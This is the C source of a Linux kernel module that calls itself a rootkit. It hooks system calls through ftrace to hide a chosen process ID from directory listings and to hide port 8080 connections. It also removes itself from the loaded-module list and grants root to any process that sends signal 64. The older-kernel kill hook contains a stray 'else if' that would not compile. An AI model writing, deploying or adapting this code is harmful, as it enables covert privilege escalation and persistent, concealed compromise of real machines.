#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/tcp.h>
#include <linux/utsname.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fluffydolphin");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.01");


static short hidden = 1;
static short mkdir_state = 1;
char hide_pid[NAME_MAX];
static short hide_port = 8080;


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(hide_port);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif


#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);


asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0)
        && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }  
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;

    }
    
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}


asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}

asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;

    void set_root(void);
    void showme(void);
    void hideme(void);

    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    else if ( (sig == 63) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit!\n");
        hideme();
        hidden = 1;
        return 0;
    }
    else if ( (sig == 63) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit!\n");
        showme();
        hidden = 0;
        return 0;
    }

    else if (sig == 62)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    
    else if (sig == 61)
    {
        printk(KERN_INFO "SIG                    Description\n");
        printk(KERN_INFO "---                    -----------\n");
        printk(KERN_INFO "61                     prints this\n");
        printk(KERN_INFO "62                     hides a process based on the PID input of the kill command\n");
        printk(KERN_INFO "63                     shows/hides the rootkit (hidden by default)\n");
        printk(KERN_INFO "64                     gives root\n");
        return 0;
    }

    else
    {
        return orig_kill(regs);
    }
}
#else


static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);  
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
static asmlinkage long (*orig_kill)(pid_t pid, int sig);



asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents64(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
    error = copy_from_user(dirent_ker, dirent, ret);
    if(error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0)
        && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = orig_getdents(fd, dirent, count);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    long error;
        error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0) )
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);  
    return ret;
}


asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);

    orig_mkdir(pathname, mode);
    return 0;
}


asmlinkage int hook_kill(pid_t pid, int sig)
{

    void set_root(void);
    void showme(void);
    void hideme(void);

    else if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    else if ( (sig == 63) && (hidden == 0) )
    {
        printk(KERN_INFO "rootkit: hiding rootkit!\n");
        hideme();
        hidden = 1;
        return 0;
    }
    else if ( (sig == 63) && (hidden == 1) )
    {
        printk(KERN_INFO "rootkit: revealing rootkit!\n");
        showme();
        hidden = 0;
        return 0;
    }

    else if (sig == 62)
    {
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }

    else if (sig == 61)
    {
        printk(KERN_INFO "SIG                    Description\n");
        printk(KERN_INFO "---                    -----------\n");
        printk(KERN_INFO "61                     prints this\n");
        printk(KERN_INFO "62                     hides a process based on the PID input of the kill command\n");
        printk(KERN_INFO "63                     shows/hides the rootkit (hidden by default)\n");
        printk(KERN_INFO "64                     gives root\n");
        return 0;
    }

    else
    {
        return orig_kill(pid, sig);
    }
}
#endif


void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


static struct list_head *prev_module;

void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


void showme(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}


//#ifdef verison_release

//#else
static struct ftrace_hook hooks[] = {
#ifdef PTREGS_SYSCALL_STUBS
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
#else 
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
#endif
HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};


static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    hideme();
    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);